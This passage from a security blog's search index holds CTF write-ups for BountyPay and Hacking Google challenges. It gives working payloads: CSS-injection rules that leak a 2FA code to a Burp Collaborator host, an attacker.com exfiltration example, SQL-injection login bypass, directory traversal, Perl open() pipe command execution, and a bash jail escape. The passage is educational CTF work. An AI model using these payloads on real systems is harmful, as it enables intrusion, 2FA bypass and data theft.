upgradeToAdmin</code> and the link we need to report looks like this:</p> <pre><code>/?template=ticket&amp;ticket_id=3582#tab3\n</code></pre> <p>At this point the third requirement looks impossible since the only place where there is an input with a name of <code>username</code> is the login page. The good news is that we can set the value of the field by passing the username as a get parameter.</p> <pre><code>?template=login&amp;username=test\n</code></pre> <p>Great ! If only we could load both template at the same time... Maybe if we can send multiple values for the template param ?</p> <p>The same way there is no concensus over how objects should be represented in query parameters, there is no standardized way to format arrays of values in query parameters. Here are some ways to do it:</p> <pre><code>?foo=bar&amp;foo=qux\n?foo[]=bar&amp;foo[]=qux\n?foo=bar,qux\n</code></pre> <p>Luckily for us, repeating the parameter along with empty square brackets did the trick ! Our final payload looks like this:</p> <pre><code>/?template[]=login&amp;template[]=ticket&amp;username=sandra.allison&amp;ticket_id=3582#tab3\n</code></pre> <p>Warning</p> <p>If you try to use this URL and then use the report page feature this will not work. The hash part <code>#tab3</code> will not be sent. You will need to encode it manually.</p> <p>When we submit it using the report page feature we get back an updated cookie which let us acces the admin tab revealing the credentials of Marten Mickos !</p> <p></p> <p>Info</p> <p>Something I have not mentioned is that for this part, every information (profile name and avatar) was actually stored in the cookie and there was no data persistance which might be confusing since this means that this attack could not work. Indeed the admin would have a different cookie without our information. Since everything was pointing in the same direction I tought this was probably simulated and that we could ignore it. This was later confirmed to me by @adamtlangley the creator of the challenge.</p>","tags":["CTF"]},{"location":"blog/h1-2006-ctf---writeup/#you-will-pay-for-this","title":"You will pay for this !","text":"<p>Once we are logged in using M\u00e5rten Mickos credentials we can finally see some transactions to process for the month of may.</p> <p></p> <p>Sadly clicking on pay does not show us the final flag but a new 2FA screen that cannot be as easily bypassed as the first one...</p> <p></p> <p>Let's look at the request:</p> <pre><code>POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nContent-Length: 73\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: https://app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4079.0 Safari/537.36 autochrome/purple\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nCookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\n\napp_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css\n</code></pre> <p>Something stands out here, there is an <code>app_style</code> parameter containing the URL of a CSS file: https://www.bountypay.h1ctf.com/css/uni_2fa_style.css</p> <pre><code>/**\nTemplate for the UNI 2FA App\n */\n\nbody {\n    background-color: #FFFFFF;\n}\n\ndiv.branding {\n    height:80px;\n    width:80px;\n    margin:20px auto 40px auto;\n    background-image:url(\"https://www.bountypay.h1ctf.com/images/bountypay.png\");\n    background-position:center center;\n    background-repeat: no-repeat;\n    background-size: cover;\n}\n</code></pre> <p>... and we only have 2 minutes to send the 2FA code.</p> <p></p> <p>In the response we can see that the max length of the 2FA is seven characters:</p> <pre><code>&lt;input name=\"challenge_answer\" class=\"form-control\" maxlength=\"7\"&gt;\n</code></pre> <p>The idea here, while not really realist, is that the CSS file that is sent, is then included in the page that the 2FA app is using to generate the 2FA code. If this is true, this means that we will probably need to use a CSS injection attack to leak the 2FA code. We can confirm this by sending the request with an <code>app_style</code> that point to a server in our control. For this, I used Burp Collaborator:</p> <pre><code>POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nContent-Length: 75\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: https://app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4079.0 Safari/537.36 autochrome/purple\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nCookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\n\napp_style=https%3A%2F%2F0stbry4if5vk4bspeq59bh6zoqugi5.burpcollaborator.net\n</code></pre> <p>The request was received from IP address 3.21.98.146, the same IP used by all the applications.</p> <pre><code>GET / HTTP/1.1\nHost: 0stbry4if5vk4bspeq59bh6zoqugi5.burpcollaborator.net\nConnection: keep-alive\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36\nAccept: text/css,*/*;q=0.1\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode: no-cors\nSec-Fetch-Dest: style\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US\n</code></pre> <p>The User-Agent tells us that the browser used is HeadlessChrome which is common in CTF. At this point, I had some idea on how to proceed since I knew you could exfiltrate data using CSS but there was something I was missing.</p> <p>The general CSS injection data exfiltration method is to use CSS like:</p> <pre><code>/* https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d */\ninput[name=csrf][value^=a]{\n    background-image: url(https://attacker.com/exfil/a);\n}\ninput[name=csrf][value^=b]{\n    background-image: url(https://attacker.com/exfil/b);\n}\n/* ... */\ninput[name=csrf][value^=9]{\n    background-image: url(https://attacker.com/exfil/9);   \n}\n</code></pre> <p>Then, <code>attacker.com</code> would load an iframe with this css injection on it on <code>target.com</code> . <code>attacker.com</code> would then wait for a request to <code>https://attacker.com/exfil/&lt;data&gt;</code>. The iframe trick is useful since we can guess one character at a time.</p> <p>In our case, we cannot do this since there is no way to iframe the app. The thing is, bruteforcing a 7 character 2FA code is not doable if the alphabet is a-zA-Z0-9 since this represent 1,028,071,702,528 combinations.</p> <p>After some trials and errors I realized that there are actually 7 inputs in the page, one for each character ! This makes the challenge way easier since this requires 364 (52*7) combinations only ! </p> <p>I wrote a small Ruby script to generate all the combinations:</p> <pre><code>(1..7).to_a.each do |ct|\n    (('a'..'z').to_a + ('0'..'9').to_a).each do |char|\n        puts \"input:nth-child(#{ct})[value^=\\\"#{char}\\\"] {background:url(\\\"http://#{ct}-#{char}.lwl3lz48tr50o2qlajeftgkff6lx9m.burpcollaborator.net\\\");}\"\n    end\n\n    ('A'..'Z').to_a.each do |char|\n        puts \"input:nth-child(#{ct})[value^=\\\"#{char}\\\"] {background:url(\\\"http://#{ct}-m#{char}.lwl3lz48tr50o2qlajeftgkff6lx9m.burpcollaborator.net\\\");}\"\n    end\nend\n</code></pre> <p>Info</p> <p>We are using nth-child() to matches the inputs element based on their position since the first character should be the first input.</p> <p>The output looks like this:</p> <pre><code>input:nth-child(6)[value^=\"a\"] {background:url(\"http://1-a.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net\");}\n/* ... */\ninput:nth-child(6)[value^=\"z\"] {background:url(\"http://6-z.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net\");}\ninput:nth-child(6)[value^=\"0\"] {background:url(\"http://6-0.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net\");}\n/* ... */\ninput:nth-child(6)[value^=\"9\"] {background:url(\"http://6-9.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net\");}\ninput:nth-child(6)[value^=\"A\"] {background:url(\"http://6-mA.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net\");}\n/* ... */\ninput:nth-child(6)[value^=\"Z\"] {background:url(\"http://6-mZ.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net\");}\n</code></pre> <p>To host the final payload I used GitHub Gist and raw.githack.com to set the proper <code>Content-Type</code> headers:</p> <pre><code>app_style=&lt;@urlencode_5&gt;https://gist.githack.com/Techbrunch/82c3691e20a6c754a4f16e93d752cc3e/raw/837efa256058fc642443b7c59e81c7827d4a1ff4/h12006.css&lt;@/urlencode_5&gt;\n</code></pre> <p>This is how it looks like in Burp after we submit our payload (here I'm using Taborator):</p> <p></p> <p>Based on the requests made to the collaborator we can easily extract the 2FA code.</p> <pre><code>1-mt.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net\n2-mv.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net\n3-u.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net\n4-7.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net\n5-my.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net\n6-1.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net\n7-mw.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net\n</code></pre> <p>For this request, the 2FA code is <code>TVu7Y1W</code> , once submitted we get the final FLAG !</p> <p></p> <p>I hope you enjoyed reading this writeup, if so you can follow me on Twitter at @TechbrunchFR.</p>","tags":["CTF"]},{"location":"blog/hacking-google-ep002---detection--response/","title":"Hacking Google EP002 - Detection &amp; Response","text":"<p>My writeup for EP000 of the Hacking Google CTF : Operation Aurora.</p>","tags":["CTF"]},{"location":"blog/hacking-google-ep002---detection--response/#challenge-01-steganography","title":"Challenge 01 - Steganography","text":"<p>This image might look familiar. But where have you seen it before?</p> <p>Hint: Sometimes the answers are hidden in plain site</p> <p>We are provided with a PNG image:</p> <pre><code>\u276f file challenge.png\nchallenge.png: PNG image data, 1326 x 462, 8-bit/color RGBA, non-interlaced\n</code></pre> <p>The hint suggest that we look at a simmilar image. The image is the same image displayed as the background on the website. If we compare the two they are different:</p> <pre><code>\u276f md5sum website.png\nff8251f71d342e60b52083150baeaddd  website.png\n\u276f md5sum challenge.png\n60cace3aa51d065870abe7be308d8bc1  challenge.png\n</code></pre> <p>Checking for strings in the one from the website returns some information in the textual information chunks (metadata<sup>1</sup>):</p> <pre><code>\u276f strings website.png\nIHDR\npHYs\nsRGB\ngAMA\ntEXtAuthor\nCrash OverrideR\n\niTXtComment\nD&amp;R found our last message\nso just using base64-encoding isn't going to be enough...\n</code></pre> <p>The full message appears to indicate that what we are looking for is hidden certificate and that steganography is being used to hide it in an image:</p> <p>D&amp;R found our last message \ud83d\ude43 so just using base64-encoding isn't going to be enough. Maybe hide it in an SSL certificate? Should pass DLP checks. And use LSB stego, I'm sure that'll fool them. I found an online tool that works to read it (I'll send you a link) so we can probably deprecate your custom decoding tool. Oh and remember to delete this message before you check in the changes \ud83e\udd10.</p> <p>Using StegOnline we can clearly see that something is present at the beginning of the file in bit 0 for R, G, B and Alpha. Using a Cyberchef recipe we can extract the certificate from the image:</p> <pre><code>-----BEGIN CERTIFICATE-----\nMIIDZzCCAk8CFBoKXnXdnNubl8olJdv40AxJ9wksMA0GCSqGSIb3DQEBBQUAMHAx\nCzAJBgNVBAYTAkNIMQ8wDQYDVQQIDAZadXJpY2gxOzA5BgNVBAoMMmh0dHBzOi8v\naDRjazFuZy5nb29nbGUvc29sdmUvNTNjdXIxVHlfQnlfMGI1Q3VyMXRZMRMwEQYD\nVQQDDApnb29nbGUuY29tMB4XDTIyMDkzMDE4NTEwNVoXDTMyMDkyNzE4NTEwNVow\ncDELMAkGA1UEBhMCQ0gxDzANBgNVBAgMBlp1cmljaDE7MDkGA1UECgwyaHR0cHM6\nLy9oNGNrMW5nLmdvb2dsZS9zb2x2ZS81M2N1cjFUeV9CeV8wYjVDdXIxdFkxEzAR\nBgNVBAMMCmdvb2dsZS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB\nAQDCX25BoQBBndrOiS6L11/RwWf6FNS+fUct7CLq9yMxU+xJ+yPVFZa7+trkvwe0\nIXWduNIb/USvtOb8I8X8H/MHVMCypBQisFMxHnZmv2D/QVRySIJpMdah8va+LL5o\n7Dv0LD73ynGUw8rW8VQUrlGF5cJRSgd3ZVbDUjR33GD4TjdIChzs/WMZGSP7c/lk\nsSLMd2eCYbdwo5pz7KaYa7ta0b3gf055q4E/uJ00TUN26GkYOi/c7PZrgQu+hXR6\nonn2HhkBNrloUlZaI5kJ2v3QRHt2UxnAhS7YVpQ6ZS4h8LQf6mvnZ/Zx71SyZmkk\nAuvhSjU8bCeIypSC82RbEi6fAgMBAAEwDQYJKoZIhvcNAQEFBQADggEBABj1PIHB\ncKJgxEXo6AT+8OMYWFd2mtthM2HsioevNvmpsAQjjlPRfY3E9DF7H49XagnON3YM\ndDvN4IwmHSRKIemdEyc/D2+Dr/Ky5FSU6NymUiUGUGV+aDGXIFV/NOaq0b9ASbBh\n78TLN2+/Val933tHWQpPqmpw30v4XknYPF5R+ghqr9r9A0dVPstDmq1HBOuazWJe\nDBUBHenbSW6EPnFYZc8zuCSLZtIJvlAryJrmcFWTridUmtXjM5Lyh05LFAFVH6wl\nz0sVEvisfE9aw4zfotBsV6zvgOL1ypYsX20KJ6zIJycRBkWgmOzQxKCZ5fxfKCFT\n8mr99Mujp9EBzPA=\n-----END CERTIFICATE-----\n</code></pre> <p>When parsed using Cyberchef we get the flag:</p> <pre><code>Version:          1 (0x00)\nSerial number:    148664996155893488627904951239968879597233572140 (0x1a0a5e75dd9cdb9b97ca2525dbf8d00c49f7092c)\nAlgorithm ID:     SHA1withRSA\nValidity\n  Not Before:     30/09/2022 18:51:05 (dd-mm-yyyy hh:mm:ss) (220930185105Z)\n  Not After:      27/09/2032 18:51:05 (dd-mm-yyyy hh:mm:ss) (320927185105Z)\nIssuer\n  C  = CH\n  ST = Zurich\n  O  = https://h4ck1ng.google/solve/53cur1Ty_By_0b5Cur1tY\n  CN = google.com\nSubject\n  C  = CH\n  ST = Zurich\n  O  = https://h4ck1ng.google/solve/53cur1Ty_By_0b5Cur1tY\n  CN = google.com\n</code></pre>","tags":["CTF"]},{"location":"blog/hacking-google-ep002---detection--response/#challenge-02-forensic","title":"Challenge 02 - Forensic","text":"<p>After recent attacks, we\u2019ve developed a search tool. Search the logs and discover what the attackers were after. HINT: Use the tool to be forensic in your search.</p> <p>For this challenge we are given two files:</p> <pre><code>\u276f tree\n.\n\u251c\u2500\u2500 CTF CSV-EASY-final.csv\n\u2514\u2500\u2500 Readme.md\n\n0 directories, 2 files\n</code></pre> <p>The README explains that we should use timesketch, an open-source tool for collaborative forensic timeline analysis, to analyze the CSV file and find the exfiltration channel used by the attacker.</p> <p>While I liked the idea of using a CTF challenge to push people to try new tools, it was a bit too easy to find the flag without actually using timesketch:</p> <pre><code>\u276f cat CTF\\ CSV-EASY-final.csv|grep http\n2022-06-24 10:27:55+00,Event Time,ALLOW,\"PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=\"\"exfil-xbhqwf-$($SourceFile.name)\"\";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3\n</code></pre> <p>Just visit: https://h4ck1ng.google/solve/d3_T3c_i0n_r35P_0ns3 to solve the challenge</p>","tags":["CTF"]},{"location":"blog/hacking-google-ep002---detection--response/#challenge-03-quarantine-shell","title":"Challenge 03 - Quarantine Shell","text":"<p>Welcome to the shell. See if you can leave. socat FILE:<code>tty</code>,raw,echo=0 TCP:quarantine-shell.h4ck.ctfcompetition.com:1337</p> <p>Hint: How can you ask the shell for which commands are available?</p> <p>If we run the command we end up in a quarantined shell, if we use tab completion we can see a list of command:</p> <pre><code>\u276f socat FILE:`tty`,raw,echo=0 TCP:quarantine-shell.h4ck.ctfcompetition.com:1337\n== proof-of-work: disabled ==\nbash: cannot set terminal process group (1): Inappropriate ioctl for device\nbash: no job control in this shell\n\n   ___                                    _    _                ____   _            _  _\n  / _ \\  _   _   __ _  _ __  __ _  _ __  | |_ (_) _ __    ___  / ___| | |__    ___ | || |\n | | | || | | | / _` || `__|/ _` || `_ \\ | __|| || `_ \\  / _ \\ \\___ \\ | `_ \\  / _ \\| || |\n | |_| || |_| || (_| || |  | (_| || | | || |_ | || | | ||  __/  ___) || | | ||  __/| || |\n  \\__\\_\\ \\__,_| \\__,_||_|   \\__,_||_| |_| \\__||_||_| |_| \\___| |____/ |_| |_| \\___||_||_|\n\nThe D&amp;R team has detected some suspicious activity on your account and has quarantined you while they investigate\n952 days stuck at ~\n~ $\n!                    enable               quarantine_protocol\n.                    esac                 read\n:                    eval                 readarray\n[                    exec                 readonly\n[[                   exit                 return\n]]                   export               select\n_dnr_toolkit         false                set\nalias                fc                   shift\nbg                   fg                   shopt\nbind                 fi                   source\nbreak                for                  suspend\nbuiltin              function             test\ncaller               getopts              then\ncase                 hash                 time\ncd                   help                 times\ncommand              history              trap\ncompgen              if                   true\ncomplete             in                   type\ncompopt              jobs                 typeset\ncontinue             kill                 ulimit\ncoproc               let                  umask\ndeclare              local                unalias\ndirs                 logout               unset\ndisown               mapfile              until\ndo                   popd                 wait\ndone                 printf               while\necho                 pushd                {\nelif                 pwd                  }\nelse                 quarantine\n~ $\n</code></pre> <p>If we can use tab completion and path traversal to list files and directories:</p> <pre><code>~ $ ../../\nbin/                lib32/              root/\nboot/               lib64/              run/\ndefault_serverlist  libx32/             sbin/\ndev/                login.sh            srv/\ndnr_helpers.sh      media/              sys/\netc/                mnt/                tmp/\nflag                opt/                usr/\nhome/               proc/               var/\nlib/                quarantine.sh\n</code></pre> <p>We can see that the flag is at <code>/flag</code>.</p> <p>I used this small Python script to fuzz what was available:</p> <pre><code>from pwn import *\ncontext.log_level = 'error'\nfor command in [b'!', b'.', b':', b'[', b'[[', b']]', b'_dnr_toolkit', b'alias', b'bg', b'bind', b'break', b'builtin', b'caller', b'case', b'cd', b'command', b'compgen', b'complete', b'compopt', b'continue', b'coproc', b'declare', b'dirs', b'disown', b'do', b'done', b'echo', b'elif', b'else', b'enable', b'esac', b'eval', b'exec', b'exit', b'export', b'false', b'fc', b'fg', b'fi', b'for', b'function', b'getopts', b'hash', b'help', b'history', b'if', b'in', b'jobs', b'kill', b'let', b'local', b'logout', b'mapfile', b'popd', b'printf', b'pushd', b'pwd', b'quarantine', b'quarantine_protocol' b'read' b'readarray' b'readonly' b'return' b'select' b'set' b'shift' b'shopt' b'source' b'suspend' b'test' b'then' b'time' b'times' b'trap' b'true' b'type' b'typeset' b'ulimit' b'umask' b'unalias' b'unset' b'until' b'wait' b'while' b'{', b'}']:\n    r = remote('quarantine-shell.h4ck.ctfcompetition.com', 1337)\n    r.recvuntil(b'$ ')\n    r.sendline(command)\n    data = r.recvrepeat(0.1)\n    r.close()\n</code></pre> <p>We can notice that entering <code>!</code> will return an error giving us a bit of insight on how the jail works:</p> <pre><code>command blocked: trap quarantine_protocol DEBUG\ncheck completions to see available command\n</code></pre> <p>In the end thanks to some hint from my coworkers I managed to solve it by redefining the <code>quarantine_protocol</code> and calling it:</p> <pre><code>~ $ quarantine_protocol () { ls; }\n~ $ quarantine_protocol\nbash: ls: No such file or directory\n~ $ quarantine_protocol () { ../../flag;}\n~ $ quarantine_protocol\n../../flag: /usr/share/bashdb/bashdb-main.inc: No such file or directory\n../../flag: warning: cannot start debugger; debugging mode disabled\n../../flag: line 1: https://h4ck1ng.google/solve/Y0U_c0mpL3T3_M3: No such file or directory\n</code></pre> <ol> <li> <p>The Metadata in PNG files \u21a9</p> </li> </ol>","tags":["CTF"]},{"location":"blog/hacking-google-ep000---operation-aurora/","title":"Hacking Google EP000 - Operation Aurora","text":"<p>My writeup for EP000 of the Hacking Google CTF : Operation Aurora.</p> <p>Before reading this writeup I suggest you first check the accompanying video on Youtube from the HACKING GOOGLE series. The Hacking Google CTF will be available for a while so maybe give it a try before reading this writeup ;)</p>","tags":["CTF","Web"]},{"location":"blog/hacking-google-ep000---operation-aurora/#challenge-01-hacker-chess","title":"Challenge 01 - Hacker Chess","text":"<p>A clean and fair game of chess. Careful though, this is not a game for grandmasters to win.</p> <p>Hint: Don't make this game harder than it needs to be.</p> <p> </p> https://hackerchess-web.h4ck.ctfcompetition.com/ <p>The application let's you play chess against an AI but something phishy is going on since the difficulty levels are <code>Invicible</code>, <code>Unbeatable</code> and <code>Impossible</code>. This was enough to dissuade me from trying to beat this challenge in a fair game of Chess.</p> <p>Instead I checked the Master Login form:</p> <pre><code>&lt;body&gt;\n  &lt;form method=\"post\"&gt;\n    username: &lt;input type=\"text\" name=\"username\" /&gt;&lt;br /&gt;\n    password: &lt;input type=\"password\" name=\"password\" /&gt;&lt;br /&gt;\n    &lt;input type=\"submit\" /&gt;\n  &lt;/form&gt;\n&lt;/body&gt;\n</code></pre> <p>My first attempt was to use a basic SQL injection<sup>1</sup> to bypass the login form: <code>' or 1=1-- a</code>. This was enough to access the administration panel.</p> <pre><code>&lt;body&gt;\n  &lt;h1&gt;Change config of the Chess AI!&lt;/h1&gt;\n  &lt;form method=\"POST\"&gt;\n    Thinking Time: &lt;input type=\"number\" name=\"thinking_time\" value=\"\"&gt;&lt;br /&gt;\n    AI Queen Cheats: &lt;input type=\"radio\" id=\"cheats_enabled\" name=\"cheats_enabled\" value=\"1\"&gt; &lt;label\n      for=\"cheats_enabled\"&gt;Yes&lt;/label&gt; &lt;input type=\"radio\" id=\"cheats_enabled\" name=\"cheats_enabled\" value=\"0\"&gt;\n    &lt;label for=\"cheats_enabled\"&gt;No&lt;/label&gt;&lt;!-- Currently set to:  --&gt;\n    &lt;input type=\"submit\"&gt;\n  &lt;/form&gt;\n&lt;/body&gt;\n</code></pre> <p>Info</p> <p>In challenge 3 of EP001 we found a way to look at the source code which was already exploitable here. We can use it to see the code vulnerable to SQL injection:</p> <pre><code>&lt;?php\n\nif (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) {\n  $query = sprintf(\"SELECT username FROM chess_ctf_admins WHERE username='%s' AND password='%s'\", $_POST['username'], $_POST['password']);\n}\n</code></pre> <p>To make sure that I would be able to win I set the <code>AI Queen Cheats</code> to <code>No</code> and changed the <code>Thinking Time</code> to <code>1</code> (second ?). I then used Next Chess Move to stack all the odds in my favour. It should be noted that I had to use Burp to be able to promote a piece and castling did not appear to be implemented.</p> <p>Winning the game resulted in the Flag being displayed:</p> <p>ZOMG How did you defeat my AI :(. You definitely cheated. Here's your flag: https://h4ck1ng.google/solve/h4cker_a1_d3f34t3d_n1c3</p>","tags":["CTF","Web"]},{"location":"blog/hacking-google-ep000---operation-aurora/#challenge-02-log-search-tool","title":"Challenge 02 - Log Search Tool","text":"<p>After recent attacks, we\u2019ve developed a search tool. Search the logs and discover what the attackers were after.</p> <p>Hint: Always search deeper.</p> <p> </p> https://aurora-web.h4ck.ctfcompetition.com/ <p>This time the application let's you search a term in a limited list of log files. I quickly realized that it was possible to manipulate the request to read other file from the system using directory traversal<sup>2</sup>.</p> <p>Using the following payload <code>file=../../etc/passwd&amp;term=/usr</code> we can read <code>/etc/passwd</code>. The problem is that we don't know where the flag is so we need to dig deeper.</p> <p>Info</p> <p>I realized while writing this writeup that this was in fact enough to solve the challenge with a little bit of guessing since the flag was located at <code>/flag</code> and we knew from the previous challenge the format of the flag. The following payload gets you the flag: <code>file=../../flag&amp;term=google</code>.</p> <p>Looking at the code of the webpage we notice a comment referencing a file <code>/src.txt</code> under the webroot. This file contains the source of the running Perl application:</p> src.txt<pre><code>use strict;\nuse warnings;\n\nuse utf8::all;\nuse CGI;\nuse HTML::Template;\n\nsub files_in_dir {\n  my $dirname = shift;\n  opendir my $dir, $dirname;\n  my @files = grep $_ ne \".\" &amp;&amp; $_ ne \"..\", readdir $dir;\n  closedir $dir;\n  return @files;\n}\n\nsub find_lines {\n  my ($filename, $needle) = @_;\n  my @results = ();\n  if (length($needle) &gt;= 4) {\n    # I am sure this is totally secure! (1)\n    open(my $fh, \"logs/\".$filename);\n    while (my $line = &lt;$fh&gt;) {\n      if (index(lc($line), lc($needle)) &gt;= 0) {\n        push(@results, $line);\n      }\n    }\n  }\n  return @results;\n}\n\nsub list_to_tmpl {\n  my ($tmpl_name, @elems) = @_;\n  my @results = ();\n  while (@elems) {\n    push(@results, {$tmpl_name, shift @elems});\n  }\n  return \\@results;\n}\n\nsub main_page {\n  my $tmpl = HTML::Template-&gt;new(filename =&gt; \"templates/default.html\");\n  $tmpl-&gt;param(FILES =&gt; list_to_tmpl(\"NAME\", files_in_dir(\"logs\")));\n  return $tmpl-&gt;output;\n}\n\nmy $q = CGI-&gt;new;\n\nmy $pfile = $q-&gt;param(\"file\");\nif (($pfile // \"\") eq \"\") {\n  print $q-&gt;header(-charset =&gt; \"utf-8\");\n  print main_page;\n} else {\n  print $q-&gt;header(-type =&gt; \"text/plain\", -charset =&gt; \"utf-8\");\n  print join(\"\", find_lines($pfile, scalar $q-&gt;param(\"term\")));\n}\n</code></pre> <ol> <li>This one is a big hint and we should investigate !</li> </ol> <p>The comment lead me to the following piece of documentation<sup>3</sup> regarding the <code>open</code> function in Perl:</p> <p>The open() function in Perl is used to open files. In its most common form, it is used in the following way:</p> <pre><code>open (FILEHANDLE, \"filename\");\n</code></pre> <p>Used like this, \"filename\" is open in read-only mode. If \"filename\" is prefixed with the \"&gt;\" sign, it is open for output, overwriting the file if it already exists. If it is prefixed with \"&gt;&gt;\" it is open for appending. The prefix \"&lt;\" opens the file for input, but this is also the default mode if no prefix is used. Some problems of using unvalidated user input as part of the filename should already be obvious. For example the backward directory traversing trick works just as well here.</p> <p>There are other worries. Let's modify our script to use open() instead of \"cat\". We would have something like:</p> <pre><code>open (STATFILE, \"/usr/stats/$username\");\n</code></pre> <p>and then some code to read from the file and show it. The Perl documentation tells us that:</p> <p>If the filename begins with \"|\", the filename is interpreted as a command to which output is to be piped, and if the filename ends with a \"|\", the filename is interpreted as a command which pipes output to us.</p> <p>The user can then run any command under the /usr/stats directory, just by postfixing a '|'. Backwards directory traversal can allow the user to execute any program on the system.</p> <p>So there is not only a directory traversal issue but we can also execute arbitrary code on the system such as <code>ls</code> and <code>cat</code>.</p> <p>If we use the following payload <code>?file=../../usr/bin/ls%20-l%20/|&amp;term=flag</code> we can see the partial result of <code>ls</code>:</p> <pre><code>-rw-r--r--   1 nobody nogroup   52 Aug 18 12:08 flag\n</code></pre> <p>To get the flag we can use <code>file=../../usr/bin/cat%20/flag|&amp;term=google</code>:</p> <p>https://h4ck1ng.google/solve/Y37_@N07h3r_P3r1_H@X0R</p> <ol> <li> <p>SQL Injection \u21a9</p> </li> <li> <p>Directory traversal \u21a9</p> </li> <li> <p>Security Issues in Perl Scripts \u21a9</p> </li> </ol>","tags":["CTF","Web"]},{"location":"blog/hacking-google-ep003---red-team/","title":"Hacking Google EP003 - Red Team","text":"<p>My writeup for EP003 of the Hacking Google CTF : Red Team.</p>","tags":["CTF","Reversing","Mobile"]},{"location":"blog/hacking-google-ep003---red-team/#challenge-01-multivision","title":"Challenge 01 - Multivision","text":"<p>To make sure things are safe, sometimes, you need someone to break them.</p> <p>Blink and you'll miss it (9:29). Blink and you'll miss it again (15:09).</p> <p>Can you hunt down the secret corporate documents? socat FILE:<code>tty</code>,raw,echo=0 TCP:multivision.h4ck.ctfcompetition.com:1337</p> <p>Hint: Find the key, and put RFC 6749 to use</p> <p>If we try to connect we are asked for a password:</p> <pre><code>\u276f socat FILE:`tty`,raw,echo=0 TCP:multivision.h4ck.ctfcompetition.com:1337\n== proof-of-work: disabled ==\nPassword:\na\nfailed authentication :(\n</code></pre> <p>If we look closely at the Episode 3 at 9:29 we can see the same login interface and at 15:09 a password on a Swiss Army Knife: <code>WhoPutMyPasswordH3r3</code></p> <pre><code>\u276f socat FILE:`tty`,raw,echo=0 TCP:multivision.h4ck.ctfcompetition.com:1337\n== proof-of-work: disabled ==\nPassword:\nWhoPutMyPasswordH3r3\n*** Congratulations! ***\n*** https://h4ck1ng.google/solve/1_w0nd3r_wh47_53cr3t5_l13_h3r3 ***\ndeveloper@googlequanta.com:/home/developer$ ls\nbackup.py  login.sh  todo.txt\n</code></pre> <p>Once logged in we can see three files in our home directory. A backup script missing a token, a bash script used for the first part of this challenge and a text file mentionning a sensitive document probably containing our flag.</p> backup.pylogin.shtodo.txt <pre><code>\"\"\"\n[WIP]\nRegularly backup sensitive Google Drive files to disk\n\"\"\"\n\nimport json\nimport requests\nfrom time import sleep\n\ndoc_id = \"1Z7CQDJhCj1G5ehvM3zB3FyxsCfdvierd1fs0UBlzFFM\"\n\ndef get_file(token, file_id):\n    resp = requests.get(\n        f'https://docs.googleapis.com/v1/documents/{file_id}',\n        headers={'Authorization': f'Bearer {token}'},\n    )\n    file_content = \"\"\n    if resp.status_code != 200:\n        print(f\"Yikes!\\n{resp.text}\")\n    else:\n        file_content = json.loads(resp.text)['body']\n    return file_content\n\ndef get_token():\n    # TODO: I know it'll work with a 'documents.readonly' scope...\n    # ...just need to get the access token\n    pass\n\n# 